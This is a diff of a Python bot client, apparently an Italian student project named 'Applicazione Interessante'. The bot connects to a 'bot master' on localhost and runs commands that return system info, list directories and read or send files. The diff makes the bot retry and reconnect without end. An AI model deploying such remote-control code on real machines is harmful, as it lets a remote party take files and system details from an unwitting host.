@@ -3,31 +3,30 @@ Bot Applicazione Interessante
 
 AUTORI: Matteo Marino, Alessandro Trincone, Vincenzo Papale
 """
+
 from audioop import add
-from socket import *    #funzioni 
+from socket import *    #funzioni per le socket
 import time             #funzione sleep
-from functions import *
+from functions import * #funzioni recupero e formattazione dei dati
 
-
-serverName = "localhost"  #IP del bot master
-serverPort = 12000        #porta su cui comunica il bot master
+serverName = "localhost"            #IP del bot master
+serverPort = 12000                  #porta su cui comunica il bot master
 server = (serverName,serverPort)
-clientSocket = socket(AF_INET, SOCK_STREAM)     #creazione del socket 
+clientSocket = socket(AF_INET, SOCK_STREAM)     #creazione del socket
 error = True
-attempts = 0
-while error == True or attempts <10:    #Tenta la connessione al bot master
+while error == True:    #Tenta la connessione al bot master
     error = False
     try:
         clientSocket.connect(server)
-    except ConnectionRefusedError:
+    except ConnectionRefusedError:  #In caso trova il bot master occupato, attende 5s e ritenta
         time.sleep(5)
         error = True
-        attempts+=1
-try:
-    while True:
+
+while True:
+    try:
         messaggio = " "
         comando = clientSocket.recv(1024).decode()
-        # Visualizza info sul sistema operativo e sulla macchina
+        #Visualizza info sul SO e sulla macchina
         if comando == "1":
             messaggio = SystemInfo()
         #Visualizza i file presenti nella directory corrente
@@ -62,7 +61,7 @@ try:
             try:
                 messaggio = file.read()
             except FileNotFoundError:
-                messaggio = "File non trovato\n"
+                    messaggio = "File non trovato\n"
             except Exception:
                 messaggio = "Errore nell'apertura del file\n"
         #Termina
@@ -82,12 +81,37 @@ try:
                     clientSocket.send("Errore nell'invio del file".encode())
         else:
             clientSocket.send(messaggio.encode())
-    clientSocket.close()
-except ConnectionAbortedError: 
-    f = open("./ApplicazioneInterrante/crashreport.txt","a")
-    f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Connessione Interrotta dall'host\n")
-    f.close()
-except ConnectionError:
-    f = open("./ApplicazioneInterrante/crashreport.txt","a")
-    f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Errore di connessione\n")
-    f.close()
+    except ConnectionAbortedError:          #Ritenta la connessione in caso di interruzione da parte dell'host
+        f = open("ApplicazioneInteressanteCrash.txt","a")     #Crea un crashreport indicando l'errore avvenuto
+        f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Applicazione Interessante : Connessione Interrotta dall'host\n")
+        f.close()
+        while error == True:
+            error = False
+            try:
+                clientSocket.connect(server)
+            except ConnectionRefusedError:
+                time.sleep(5)
+                error = True
+    except ConnectionResetError:           #Ritenta la connessione in caso di un'interruzione forzata da parte dell'host remoto
+        f = open("ApplicazioneInteressanteCrash.txt","a")    #Crea un crashreport indicando l'errore avvenuto
+        f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Applicazione Interessante : Connessione Interrotta forzatamente dall'host remoto\n")
+        f.close()
+        while error == True:
+            error = False
+            try:
+                clientSocket.connect(server)
+            except ConnectionRefusedError:
+                time.sleep(5)
+                error = True
+    except ConnectionError:                #Ritenta la connessione in caso di un errore generico di connessione
+        f = open("ApplicazioneInteressanteCrash.txt","a")    #Crea un crashreport indicando l'errore avvenuto
+        f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Applicazione Interessante : Errore di connessione\n")
+        f.close()
+        while error == True:
+            error = False
+            try:
+                clientSocket.connect(server)
+            except ConnectionRefusedError:
+                time.sleep(5)
+                error = True
+clientSocket.close()
